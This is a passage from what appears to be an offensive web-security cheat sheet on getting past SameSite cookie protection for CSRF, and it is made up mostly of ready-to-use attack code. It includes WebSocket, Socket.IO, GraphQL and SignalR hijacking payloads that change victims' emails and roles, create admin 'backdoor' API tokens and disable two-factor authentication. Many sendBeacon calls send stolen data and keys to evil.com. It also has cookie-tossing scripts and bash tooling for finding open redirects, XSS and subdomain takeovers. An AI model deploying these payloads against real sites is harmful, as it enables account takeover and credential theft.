  // Step 2: Redirect to API endpoint with method override
  window.location = 'https://target.com/redirect?url=' +
    encodeURIComponent('/api/user/email?_method=POST&email=attacker@evil.com');
  </script>

  <!-- Technique 2: POST via redirect to same-site page with auto-submit -->
  <!-- If redirect goes to a page you can inject content on -->
  <script>
  // Redirect to a same-site page that has reflected XSS
  window.location = 'https://target.com/redirect?url=' +
    encodeURIComponent('/search?q=<script>fetch("/api/user/email",{method:"POST",headers:{"Content-Type":"application/json"},credentials:"same-origin",body:JSON.stringify({email:"attacker@evil.com"})})<\/script>');
  </script>

  <!-- Technique 3: Chaining multiple redirects -->
  <script>
  // Some apps have internal redirect chains
  // /goto?url= → /redirect?next= → /api/action
  window.location = 'https://target.com/goto?url=' +
    encodeURIComponent('https://target.com/redirect?next=/api/user/email?_method=POST%26email=attacker@evil.com');
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Finding Open Redirects"}
  ```bash
  # Comprehensive open redirect discovery on same-site origins

  # Common redirect parameter names
  REDIRECT_PARAMS=(
    "url" "redirect" "redirect_url" "redirect_uri" "return" "return_url"
    "returnTo" "return_to" "next" "next_url" "goto" "go" "dest"
    "destination" "redir" "redirect_to" "continue" "continueTo"
    "target" "to" "link" "forward" "forward_url" "out" "view"
    "login_url" "logout_url" "callback" "cb" "ref" "referer"
    "RelayState" "checkout_url" "success_url" "fail_url"
  )

  TARGET="https://target.com"
  EVIL="https://evil.com"

  echo "[*] Testing open redirects on $TARGET"
  for param in "${REDIRECT_PARAMS[@]}"; do
    # Test various redirect payloads
    PAYLOADS=(
      "$EVIL"
      "//evil.com"
      "/\\evil.com"
      "////evil.com"
      "https://evil.com"
      "//evil.com/%2F.."
      "/redirect?url=https://evil.com"
      "https://target.com@evil.com"
      "https://target.com.evil.com"
      "//evil%00.com"
      "///evil.com"
      "/%0d/evil.com"
      "/evil.com"
      "https:evil.com"
    )
    
    for payload in "${PAYLOADS[@]}"; do
      location=$(curl -s -o /dev/null -w "%{redirect_url}" \
        "${TARGET}/?${param}=$(python3 -c "import urllib.parse;print(urllib.parse.quote('${payload}'))")" \
        --max-time 5 2>/dev/null)
      
      if echo "$location" | grep -qi "evil.com"; then
        echo "[+] OPEN REDIRECT: ${TARGET}/?${param}=${payload}"
        echo "    → Redirects to: $location"
      fi
    done
  done

  # Test redirect on common paths
  REDIRECT_PATHS=(
    "/redirect" "/goto" "/out" "/link" "/url" "/return"
    "/login" "/logout" "/auth/callback" "/oauth/callback"
    "/sso" "/external" "/forward" "/away" "/go"
  )

  for path in "${REDIRECT_PATHS[@]}"; do
    for param in "url" "redirect" "next" "return" "to" "goto"; do
      location=$(curl -s -o /dev/null -w "%{redirect_url}" \
        "${TARGET}${path}?${param}=https://evil.com" \
        --max-time 5 2>/dev/null)
      
      if echo "$location" | grep -qi "evil.com"; then
        echo "[+] OPEN REDIRECT: ${TARGET}${path}?${param}=https://evil.com"
      fi
    done
  done

  # Test same-site subdomain redirects
  echo ""
  echo "[*] Testing redirects on same-site subdomains..."
  cat same_site_origins.txt 2>/dev/null | while read subdomain; do
    for param in "url" "redirect" "next" "goto"; do
      location=$(curl -s -o /dev/null -w "%{redirect_url}" \
        "https://${subdomain}/?${param}=https://evil.com" \
        --max-time 5 2>/dev/null)
      
      if echo "$location" | grep -qi "evil.com"; then
        echo "[+] SUBDOMAIN REDIRECT: https://${subdomain}/?${param}=https://evil.com"
      fi
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="JavaScript Redirect Gadgets"}
  ```html
  <!-- Server-side redirects (HTTP 301/302) are most reliable -->
  <!-- But client-side JavaScript redirects also work -->

  <!-- If target has any page with: location = param_from_url -->
  <!-- Or: window.location.href = document.referrer -->

  <!-- Technique 1: Abusing JavaScript redirects -->
  <!-- Target page: /page?next=URL does client-side redirect -->
  <script>
  // Client-side redirect makes browser navigate FROM target.com
  // So subsequent requests are same-site
  window.location = 'https://target.com/page?next=' +
    encodeURIComponent('/api/user/email?_method=POST&email=attacker@evil.com');
  </script>

  <!-- Technique 2: Fragment-based redirect abuse -->
  <!-- Some apps read location.hash for navigation -->
  <script>
  window.location = 'https://target.com/app#/api/user/email?_method=POST&email=attacker@evil.com';
  </script>

  <!-- Technique 3: PostMessage-triggered redirect -->
  <!-- If target window accepts postMessage for navigation -->
  <iframe src="https://target.com/app" id="target_frame"></iframe>
  <script>
  document.getElementById('target_frame').onload = function() {
    // Send navigation command via postMessage
    this.contentWindow.postMessage({
      type: 'navigate',
      url: '/api/user/email?_method=POST&email=attacker@evil.com'
    }, 'https://target.com');
  };
  </script>

  <!-- Technique 4: Service Worker redirect interception -->
  <!-- If target has vulnerable service worker that intercepts and redirects -->
  <script>
  // Navigate to target page where service worker modifies the request
  window.location = 'https://target.com/sw-page?redirect=/api/action';
  </script>
  ```
  :::
::

## SameSite=Strict Bypass Techniques

::caution
`SameSite=Strict` blocks cookies on **all** cross-site requests, including top-level navigations. Bypassing Strict requires establishing a same-site context first — through XSS on any same-site origin, subdomain takeover, client-side redirect chains, or WebSocket connections which are not subject to SameSite restrictions.
::

### Same-Site XSS Gadgets

::tabs
  :::tabs-item{icon="i-lucide-code" label="Sibling Subdomain XSS → CSRF"}
  ```html
  <!-- XSS on ANY subdomain of the same site bypasses SameSite=Strict -->
  <!-- blog.target.com XSS → CSRF on target.com works because same-site -->

  <!-- Step 1: Find XSS on any same-site subdomain -->
  <!-- Step 2: Inject CSRF payload via XSS -->

  <!-- Attacker sends victim to XSS payload on blog.target.com -->
  <!-- blog.target.com is same-site with target.com → Strict cookies sent -->

  <!-- XSS payload hosted on blog.target.com -->
  <script>
  // Running on blog.target.com (same-site with target.com)
  // All requests to target.com will include SameSite=Strict cookies

  // Direct fetch to target.com with full cookies
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    credentials: 'include', // Cookies sent because same-site
    body: JSON.stringify({ email: 'attacker@evil.com' })
  }).then(r => {
    console.log('[+] CSRF via same-site XSS:', r.status);
    // Exfiltrate result
    navigator.sendBeacon('https://evil.com/result',
      JSON.stringify({ status: r.status, url: r.url }));
  });
  </script>

  <!-- Delivery URL (via reflected XSS on blog.target.com): -->
  <!-- https://blog.target.com/search?q=<script>fetch('https://target.com/api/user/email',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({email:'attacker@evil.com'})})</script> -->
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Subdomain Takeover → CSRF"}
  ```html
  <!-- If attacker takes over an abandoned subdomain of target.com -->
  <!-- Requests from taken-over subdomain are same-site with target.com -->
  <!-- SameSite=Strict cookies are sent! -->

  <!-- Host this on: taken-over.target.com (claimed via subdomain takeover) -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <script>
  // Running on taken-over.target.com
  // This is SAME-SITE with target.com
  // SameSite=Strict cookies are included!

  async function fullAttack() {
    // All requests include Strict cookies because same-site
    
    // Step 1: Read CSRF token (if needed)
    const csrfResp = await fetch('https://target.com/api/csrf-token', {
      credentials: 'include'
    });
    const csrfData = await csrfResp.json();
    const token = csrfData.token;

    // Step 2: Change email with valid CSRF token
    await fetch('https://target.com/api/user/email', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token
      },
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });

    // Step 3: Create API token
    const tokenResp = await fetch('https://target.com/api/tokens', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token
      },
      body: JSON.stringify({ name: 'backdoor', scope: 'admin:all' })
    });
    
    const apiKey = await tokenResp.json();
    
    // Exfiltrate
    navigator.sendBeacon('https://evil.com/exfil', JSON.stringify({
      csrf_token: token,
      api_key: apiKey
    }));
  }

  fullAttack();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Finding Same-Site Gadgets"}
  ```bash
  # Systematic search for same-site XSS and redirect gadgets

  TARGET_DOMAIN="target.com"

  # Step 1: Enumerate all same-site subdomains
  subfinder -d "$TARGET_DOMAIN" -silent | tee subdomains.txt
  amass enum -passive -d "$TARGET_DOMAIN" | tee -a subdomains.txt
  sort -u subdomains.txt -o subdomains.txt
  echo "[+] $(wc -l < subdomains.txt) subdomains found"

  # Step 2: Check which are alive
  cat subdomains.txt | httpx -silent -status-code -title | tee alive.txt

  # Step 3: Scan for XSS on all alive subdomains
  cat alive.txt | awk '{print $1}' | nuclei -t xss/ -severity critical,high -silent | tee xss_findings.txt

  # Step 4: Scan for reflected XSS via parameter fuzzing
  cat alive.txt | awk '{print $1}' | \
    while read url; do
      # Quick reflected XSS check
      resp=$(curl -s "${url}/?q=<xss_probe_12345>" | grep -c "xss_probe_12345")
      if [ "$resp" -gt 0 ]; then
        echo "[+] REFLECTION: ${url}/?q= (potential XSS)"
      fi
    done

  # Step 5: Check for subdomain takeover
  nuclei -l subdomains.txt -t takeovers/ -silent | tee takeover_findings.txt

  # Step 6: Check for dangling CNAME records
  cat subdomains.txt | while read sub; do
    cname=$(dig +short CNAME "$sub" 2>/dev/null)
    if [ -n "$cname" ]; then
      # Check if CNAME target is claimable
      resolve=$(dig +short A "$cname" 2>/dev/null)
      if [ -z "$resolve" ]; then
        echo "[!] DANGLING CNAME: $sub → $cname (NXDOMAIN)"
      fi
    fi
  done

  # Step 7: Check for file upload on same-site origins (host CSRF page)
  cat alive.txt | awk '{print $1}' | \
    while read url; do
      for path in "/upload" "/file-upload" "/api/upload" "/media/upload" "/attachments"; do
        status=$(curl -s -o /dev/null -w "%{http_code}" "${url}${path}" --max-time 5)
        if [[ "$status" =~ ^(200|405)$ ]]; then
          echo "[+] Upload endpoint: ${url}${path} (HTTP $status)"
        fi
      done
    done

  # Step 8: Check for HTML injection (even without script execution)
  cat alive.txt | awk '{print $1}' | \
    while read url; do
      resp=$(curl -s "${url}/?name=<h1>injected</h1>" | grep -c "<h1>injected</h1>")
      if [ "$resp" -gt 0 ]; then
        echo "[+] HTML INJECTION: ${url}/?name= (potential for meta refresh CSRF)"
      fi
    done
  ```
  :::
::

### Same-Site Redirect Chain (Strict Bypass)

::code-group
```html [Server-Side Redirect Chain]
<!-- Use redirects within the same site to establish same-site context -->
<!-- Then perform CSRF from within that context -->

<!-- Step 1: Initial cross-site navigation to target's redirect endpoint -->
<!-- This is a top-level navigation, but SameSite=Strict blocks cookies on first hop -->
<!-- However, the SECOND hop from target.com → target.com IS same-site -->

<!-- Technique: Double redirect via same-site -->
<!-- Cross-site → target.com/redirect → target.com/api/action -->
<!-- First hop: no cookies (cross-site) -->
<!-- Second hop: cookies included (same-site navigation from target.com) -->

<!-- BUT: This only works for GET requests -->
<!-- For POST: need method override on final endpoint -->

<script>
// Navigate to target's redirect that chains to API endpoint
window.location = 'https://target.com/redirect?url=' +
  encodeURIComponent('/api/user/email?_method=POST&email=attacker@evil.com');

// After first redirect: browser is on target.com
// Second redirect to API endpoint is same-site → Strict cookies sent
</script>
```

```html [Client-Side Redirect with Timing]
<!-- Some applications have client-side redirects with processing time -->
<!-- During the processing, a form can be submitted same-site -->

<script>
// Step 1: Navigate to target.com (establishes same-site context)
// Using a page that takes time to process/redirect
var w = window.open('https://target.com/processing-page', '_blank');

// Step 2: While window is on target.com, inject CSRF form
setTimeout(() => {
  try {
    // This only works if we can write to the popup
    // (same-origin required, which limits this to XSS scenarios)
    w.document.write(`
      <form action="/api/user/email" method="POST" enctype="text/plain">
        <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
      </form>
      <script>document.forms[0].submit();<\/script>
    `);
  } catch(e) {
    // Cross-origin — can't write to popup
    // Fall back to method override via navigation
    w.location = 'https://target.com/api/user/email?_method=POST&email=attacker@evil.com';
  }
}, 1000);
</script>
```

```bash [Finding Redirect Chains]
# Map all internal redirect chains on target
curl -v -L "https://target.com/login" \
  -H "Cookie: session=VALID" 2>&1 | \
  grep -iE "^(< HTTP|< location:|> GET|> POST)" | head -20

# Test specific redirect chain patterns
echo "[*] Testing redirect chain patterns"

CHAIN_PATTERNS=(
  "/login?next=/api/user/email?_method=POST"
  "/redirect?url=/settings"
  "/goto?target=/api/action"
  "/auth/callback?redirect=/api/user/update"
  "/sso?return_url=/api/user/email"
)

for pattern in "${CHAIN_PATTERNS[@]}"; do
  echo "Testing: $pattern"
  curl -v -L "https://target.com${pattern}" \
    -H "Cookie: session=VALID" 2>&1 | \
    grep -iE "^(< HTTP|< location:)" | head -5
  echo "---"
done

# Check number of hops in redirect chain
for path in "/login" "/oauth/callback" "/sso/login" "/redirect"; do
  hops=$(curl -s -L -o /dev/null -w "%{num_redirects}" \
    "https://target.com${path}?url=/dashboard" \
    -H "Cookie: session=VALID" --max-time 10)
  final=$(curl -s -L -o /dev/null -w "%{url_effective}" \
    "https://target.com${path}?url=/dashboard" \
    -H "Cookie: session=VALID" --max-time 10)
  echo "Path: $path → $hops redirects → Final: $final"
done
```
::

## WebSocket CSRF (Bypasses All SameSite)

::warning
WebSocket handshakes are **not** subject to SameSite cookie restrictions in any browser. When a WebSocket connection is established cross-site, all cookies (including `SameSite=Strict`) are sent during the HTTP upgrade handshake. If the application uses WebSocket for state-changing operations, this completely bypasses SameSite protection.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="WebSocket Endpoint Discovery"}
  ```bash
  # Discover WebSocket endpoints on target

  # Check JavaScript for WebSocket connections
  curl -s https://target.com/ | grep -iEo "new WebSocket\(['\"]([^'\"]+)['\"]\)"
  curl -s https://target.com/static/app.js | grep -iEo "(wss?://[^\s'\"]+|new WebSocket)"

  # Common WebSocket paths
  WS_PATHS=(
    "/ws" "/websocket" "/socket" "/socket.io" "/ws/api"
    "/realtime" "/live" "/stream" "/push" "/events"
    "/cable" "/hub" "/signalr" "/sockjs" "/graphql-ws"
    "/subscriptions" "/ws/v1" "/api/ws" "/connect"
  )

  for path in "${WS_PATHS[@]}"; do
    # Test HTTP upgrade
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com${path}" \
      -H "Upgrade: websocket" \
      -H "Connection: Upgrade" \
      -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
      -H "Sec-WebSocket-Version: 13" \
      -H "Cookie: session=VALID" \
      --max-time 5)
    
    if [[ "$status" =~ ^(101|200|400|426)$ ]]; then
      echo "[+] WebSocket endpoint: wss://target.com${path} (HTTP $status)"
    fi
  done

  # Test with websocat
  echo '{"type":"ping"}' | websocat -t --one-message \
    wss://target.com/ws \
    --header "Cookie: session=VALID" 2>&1 | head -5

  # Socket.IO detection
  curl -s "https://target.com/socket.io/?EIO=4&transport=polling" \
    -H "Cookie: session=VALID" | head -c 200

  # SignalR detection
  curl -s "https://target.com/signalr/negotiate?negotiateVersion=1" \
    -H "Cookie: session=VALID" | jq '.' 2>/dev/null

  # ActionCable (Rails) detection
  curl -s "https://target.com/cable" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" \
    -H "Cookie: session=VALID" -v 2>&1 | head -10
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Cross-Site WebSocket Hijacking"}
  ```html
  <!-- CSWSH: Cross-Site WebSocket Hijacking -->
  <!-- WebSocket connections always send cookies regardless of SameSite -->
  <!-- This works against SameSite=Strict -->

  <html>
  <body>
  <script>
  // Connect to target WebSocket FROM attacker's site
  // Cookies (including SameSite=Strict) are sent in the upgrade request
  
  const ws = new WebSocket('wss://target.com/ws');
  
  ws.onopen = function() {
    console.log('[+] WebSocket connected with victim cookies (bypasses SameSite!)');
    
    // Attack 1: Send state-changing commands
    ws.send(JSON.stringify({
      type: 'mutation',
      action: 'updateEmail',
      data: { email: 'attacker@evil.com' }
    }));
    
    // Attack 2: Change password
    ws.send(JSON.stringify({
      type: 'mutation',
      action: 'changePassword',
      data: { new_password: 'WebSocket-CSRF-2024!' }
    }));
    
    // Attack 3: Escalate privileges
    ws.send(JSON.stringify({
      type: 'mutation',
      action: 'setRole',
      data: { role: 'admin' }
    }));
    
    // Attack 4: Create API token
    ws.send(JSON.stringify({
      type: 'mutation',
      action: 'createToken',
      data: { name: 'ws-backdoor', scope: 'admin' }
    }));
    
    // Attack 5: Read sensitive data
    ws.send(JSON.stringify({
      type: 'query',
      action: 'getProfile'
    }));
    
    ws.send(JSON.stringify({
      type: 'query',
      action: 'listUsers'
    }));
  };
  
  ws.onmessage = function(event) {
    // Exfiltrate all responses to attacker server
    navigator.sendBeacon('https://evil.com/ws-data',
      new Blob([JSON.stringify({
        timestamp: Date.now(),
        data: event.data
      })], { type: 'text/plain' })
    );
    
    console.log('[+] WS Response:', event.data);
  };
  
  ws.onerror = function(error) {
    console.log('[-] WebSocket error, trying alternative paths...');
    
    // Try alternative WebSocket endpoints
    const altPaths = ['/socket', '/realtime', '/cable', '/ws/api', '/graphql-ws'];
    altPaths.forEach(path => {
      try {
        const altWs = new WebSocket('wss://target.com' + path);
        altWs.onopen = () => {
          altWs.send(JSON.stringify({
            action: 'updateEmail',
            email: 'attacker@evil.com'
          }));
        };
      } catch(e) {}
    });
  };
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Socket.IO CSRF"}
  ```html
  <!-- Socket.IO uses both polling and WebSocket transports -->
  <!-- Polling requests ARE subject to SameSite -->
  <!-- WebSocket upgrade is NOT subject to SameSite -->

  <html>
  <body>
  <!-- Include Socket.IO client library -->
  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
  
  <script>
  // Force WebSocket transport (bypasses SameSite)
  const socket = io('https://target.com', {
    transports: ['websocket'], // Skip polling, go straight to WebSocket
    withCredentials: true       // Send cookies
  });
  
  socket.on('connect', () => {
    console.log('[+] Socket.IO connected via WebSocket (SameSite bypassed)');
    
    // Emit state-changing events
    socket.emit('updateProfile', {
      email: 'attacker@evil.com',
      role: 'admin'
    });
    
    socket.emit('createApiKey', {
      name: 'socketio-backdoor',
      permissions: ['admin']
    });
    
    socket.emit('deleteUser', {
      userId: 'victim_id',
      confirm: true
    });
  });
  
  socket.on('profileUpdated', (data) => {
    navigator.sendBeacon('https://evil.com/socket-exfil', JSON.stringify(data));
  });
  
  socket.on('apiKeyCreated', (data) => {
    navigator.sendBeacon('https://evil.com/apikey-exfil', JSON.stringify(data));
  });
  
  // Listen for ALL events
  socket.onAny((eventName, ...args) => {
    navigator.sendBeacon('https://evil.com/all-events',
      JSON.stringify({ event: eventName, data: args }));
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="GraphQL Subscription CSRF"}
  ```html
  <!-- GraphQL over WebSocket for subscriptions and mutations -->
  <!-- graphql-ws protocol (newer) or subscriptions-transport-ws (legacy) -->

  <html>
  <body>
  <script>
  // GraphQL over WebSocket - bypasses SameSite=Strict
  const ws = new WebSocket('wss://target.com/graphql', 'graphql-transport-ws');
  
  ws.onopen = () => {
    // Initialize connection (graphql-ws protocol)
    ws.send(JSON.stringify({ type: 'connection_init', payload: {} }));
  };
  
  ws.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    
    if (msg.type === 'connection_ack') {
      console.log('[+] GraphQL WS connected');
      
      // Execute mutation: Change email
      ws.send(JSON.stringify({
        id: '1',
        type: 'subscribe',
        payload: {
          query: `mutation { 
            updateEmail(input: { email: "attacker@evil.com" }) { 
              success 
              user { id email } 
            } 
          }`
        }
      }));
      
      // Execute mutation: Create API token
      ws.send(JSON.stringify({
        id: '2',
        type: 'subscribe',
        payload: {
          query: `mutation { 
            createApiToken(input: { name: "gql-backdoor", scope: ADMIN }) { 
              token 
              expiresAt 
            } 
          }`
        }
      }));
      
      // Execute mutation: Change role
      ws.send(JSON.stringify({
        id: '3',
        type: 'subscribe',
        payload: {
          query: `mutation { 
            updateRole(userId: "self", role: ADMIN) { 
              success 
            } 
          }`
        }
      }));
      
      // Data exfiltration query
      ws.send(JSON.stringify({
        id: '4',
        type: 'subscribe',
        payload: {
          query: `query { 
            me { id email role apiTokens { token scope } } 
            users(limit: 100) { id email role } 
          }`
        }
      }));
    }
    
    if (msg.type === 'next' || msg.type === 'data') {
      console.log('[+] GraphQL response:', msg.payload);
      navigator.sendBeacon('https://evil.com/gql-exfil', JSON.stringify(msg));
    }
  };
  </script>
  </body>
  </html>

  <!-- Legacy subscriptions-transport-ws protocol -->
  <script>
  const wsLegacy = new WebSocket('wss://target.com/graphql', 'graphql-ws');
  
  wsLegacy.onopen = () => {
    wsLegacy.send(JSON.stringify({ type: 'connection_init', payload: {} }));
  };
  
  wsLegacy.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    if (msg.type === 'connection_ack') {
      wsLegacy.send(JSON.stringify({
        id: '1',
        type: 'start', // 'start' instead of 'subscribe' in legacy protocol
        payload: {
          query: 'mutation { updateEmail(email: "attacker@evil.com") { ok } }'
        }
      }));
    }
    if (msg.type === 'data') {
      navigator.sendBeacon('https://evil.com/exfil', JSON.stringify(msg));
    }
  };
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SignalR CSRF"}
  ```html
  <!-- ASP.NET SignalR WebSocket CSRF -->
  <!-- SignalR uses WebSocket transport which bypasses SameSite -->

  <html>
  <body>
  <script src="https://cdn.jsdelivr.net/npm/@microsoft/signalr@latest/dist/browser/signalr.min.js"></script>
  
  <script>
  // SignalR WebSocket connection (bypasses SameSite)
  const connection = new signalR.HubConnectionBuilder()
    .withUrl('https://target.com/hub', {
      skipNegotiation: true,
      transport: signalR.HttpTransportType.WebSockets,
      withCredentials: true
    })
    .build();
  
  connection.start()
    .then(() => {
      console.log('[+] SignalR connected via WebSocket');
      
      // Invoke server-side hub methods
      connection.invoke('UpdateEmail', 'attacker@evil.com');
      connection.invoke('ChangeRole', 'admin');
      connection.invoke('CreateApiKey', 'backdoor', 'admin');
      connection.invoke('DisableTwoFactor');
      
      // Query data
      connection.invoke('GetUserProfile')
        .then(data => {
          navigator.sendBeacon('https://evil.com/signalr-data', JSON.stringify(data));
        });
    })
    .catch(err => {
      console.log('[-] SignalR error:', err);
    });
  
  // Listen for server-pushed events
  connection.on('ProfileUpdated', (data) => {
    navigator.sendBeacon('https://evil.com/signalr-update', JSON.stringify(data));
  });
  </script>
  </body>
  </html>
  ```
  :::
::

## Subdomain Cookie Injection

::tip
If an attacker controls any subdomain of the target site (via takeover, XSS, or self-registration), they can set cookies for the parent domain. This breaks double-submit cookie CSRF protection and can manipulate session handling.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Cookie Tossing Attack"}
  ```html
  <!-- Cookie Tossing: Set cookie from subdomain that overrides parent domain cookie -->
  <!-- Attacker controls: evil-sub.target.com -->
  <!-- Victim site: target.com -->

  <!-- Host on evil-sub.target.com (taken over or XSS'd) -->
  <html>
  <body>
  <script>
  // Set CSRF cookie for parent domain .target.com
  // This overrides the legitimate CSRF cookie
  document.cookie = "csrf_token=attacker_controlled_value; domain=.target.com; path=/; SameSite=None; Secure";
  document.cookie = "_csrf=attacker_controlled_value; domain=.target.com; path=/";
  document.cookie = "XSRF-TOKEN=attacker_controlled_value; domain=.target.com; path=/";
  document.cookie = "_token=attacker_controlled_value; domain=.target.com; path=/";

  // Now victim visits target.com
  // Double-submit cookie check: cookie value must match header/body value
  // Attacker knows the cookie value → can include it in CSRF payload

  // Redirect victim to attacker's CSRF exploit page
  setTimeout(() => {
    window.location = 'https://evil.com/csrf-exploit.html';
  }, 500);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Double-Submit Cookie Bypass"}
  ```html
  <!-- After cookie tossing, the attacker knows the CSRF cookie value -->
  <!-- Match the cookie value in the request body/header -->

  <!-- Host on evil.com after cookie has been tossed from subdomain -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <script>
  // CSRF cookie was set to "attacker_controlled_value" via cookie tossing
  const knownToken = "attacker_controlled_value";

  // Method 1: Fetch with matching header
  fetch('https://target.com/api/user/email', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'text/plain'
      // Can't set X-CSRF-Token in no-cors mode
      // Need alternative delivery
    },
    body: JSON.stringify({
      email: 'attacker@evil.com',
      csrf_token: knownToken // Token in body matches cookie
    })
  });

  // Method 2: Form submission with token in body
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://target.com/api/user/email';
  form.enctype = 'text/plain';

  var input = document.createElement('input');
  input.type = 'hidden';
  input.name = '{"email":"attacker@evil.com","csrf_token":"' + knownToken + '","p":"';
  input.value = '"}';
  form.appendChild(input);

  document.body.appendChild(form);
  form.submit();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Finding Cookie Tossing Vectors"}
  ```bash
  # Identify subdomains where cookies can be set for parent domain

  TARGET="target.com"

  # Step 1: Find all subdomains
  subfinder -d "$TARGET" -silent | tee subs.txt

  # Step 2: Check which subdomains allow JavaScript execution
  # (XSS, taken-over, attacker-controlled)
  cat subs.txt | httpx -silent | \
    while read url; do
      # Check for reflected input
      resp=$(curl -s "${url}/?test=<script>alert(1)</script>" | \
        grep -c "<script>alert(1)</script>")
      if [ "$resp" -gt 0 ]; then
        echo "[+] XSS (cookie tossing vector): $url"
      fi
    done

  # Step 3: Check for subdomain takeover
  cat subs.txt | while read sub; do
    cname=$(dig +short CNAME "$sub" 2>/dev/null)
    if [ -n "$cname" ]; then
      nxdomain=$(dig +short A "$cname" 2>/dev/null)
      if [ -z "$nxdomain" ]; then
        echo "[!] TAKEOVER (cookie tossing): $sub → $cname (unresolved)"
      fi
    fi
  done

  # Step 4: Check for user-controlled subdomains
  # Some services create user subdomains: USER.target.com
  curl -s "https://nonexistent-user-12345.${TARGET}" -o /dev/null -w "%{http_code}"
  # If 200/302 → user subdomains exist → register and toss cookies

  # Step 5: Verify cookie scoping
  curl -sI "https://target.com/" | grep -i "set-cookie" | \
    grep -ioP "domain=\K[^;]+"
  # If domain=.target.com → cookies scoped to all subdomains
  # Subdomain can set cookies for parent domain
  ```
  :::
::

## Browser-Specific Behavior Exploitation

### Browser Version Differences

::accordion
  :::accordion-item{icon="i-lucide-chrome" label="Chrome / Chromium-Based"}
  ```bash
  # Chrome 80+: Defaults to SameSite=Lax when not set
  # Chrome 84+: Enforces Lax by default (initially rolled back due to COVID)
  # Chrome 86+: Re-enabled Lax default enforcement
  # Chrome 89+: Schemeful same-site (HTTP ≠ HTTPS)
  # Chrome 94+: Removed 2-minute Lax+POST exception for some cookie types
  # Chrome 104+: Stricter SameSite enforcement
  
  # Key exploitation:
  # - 2-minute Lax+POST window for cookies WITHOUT explicit SameSite
  # - WebSocket bypasses all SameSite
  # - Schemeful same-site: http→https is cross-site

  # Check Chrome version in User-Agent
  curl -sI https://target.com/ | grep -i "server"
  
  # Test 2-minute window applicability
  # Set cookie without SameSite, then cross-site POST within 2 min
  curl -sI https://target.com/ | grep -i "set-cookie" | \
    grep -v -i "samesite" | \
    while read line; do
      name=$(echo "$line" | grep -oP 'Set-Cookie:\s*\K[^=]+')
      echo "[2-MIN WINDOW] Cookie without SameSite: $name"
    done
  ```
  :::

  :::accordion-item{icon="i-lucide-compass" label="Firefox"}
  ```bash
  # Firefox 96+: Defaults to SameSite=Lax
  # Firefox 103+: Enhanced SameSite enforcement
  # Firefox does NOT have the 2-minute Lax+POST exception
  # Firefox may have different schemeful same-site behavior

  # Key differences from Chrome:
  # - No 2-minute Lax+POST window
  # - May treat http→https differently (not always cross-site)
  # - Different handling of redirects for SameSite purposes
  # - WebSocket still bypasses SameSite (all browsers)

  # Test Firefox-specific behavior:
  # Set Firefox User-Agent and test
  curl -X POST "https://target.com/api/update" \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VALID" \
    -H "Origin: https://evil.com" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" \
    -d '{"email":"test@probe.com"}' -v
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="Safari / WebKit"}
  ```bash
  # Safari 15.4+: Improved SameSite support
  # Safari may have different default behavior
  # Safari's ITP (Intelligent Tracking Prevention) affects cookies
  # Safari treats 3rd-party cookies more aggressively

  # Key Safari differences:
  # - ITP may block 3rd-party cookies entirely
  # - Different redirect handling for SameSite
  # - May not implement schemeful same-site
  # - Storage Access API may be required for cross-site cookies
  # - WebSocket still bypasses SameSite

  # Test with Safari User-Agent
  curl -X POST "https://target.com/api/update" \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VALID" \
    -H "Origin: https://evil.com" \
    -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15" \
    -d '{"email":"test@probe.com"}' -v
  ```
  :::

  :::accordion-item{icon="i-lucide-smartphone" label="Mobile Browser Considerations"}
  ```bash
  # Mobile browsers may have different SameSite implementations
  # In-app browsers (WebView) may not enforce SameSite at all
  # Some mobile apps use custom WebView without SameSite enforcement

  # Android WebView: May not enforce SameSite (older versions)
  # iOS WKWebView: Follows Safari's SameSite behavior
  # Facebook/Instagram in-app browser: Custom WebView
  # LinkedIn in-app browser: May have different behavior

  # Test with mobile User-Agents
  MOBILE_UAS=(
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0 Mobile"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile"
    "Mozilla/5.0 (Linux; Android 13; WebView) AppleWebKit/537.36 Chrome/120.0 Mobile"
  )

  for ua in "${MOBILE_UAS[@]}"; do
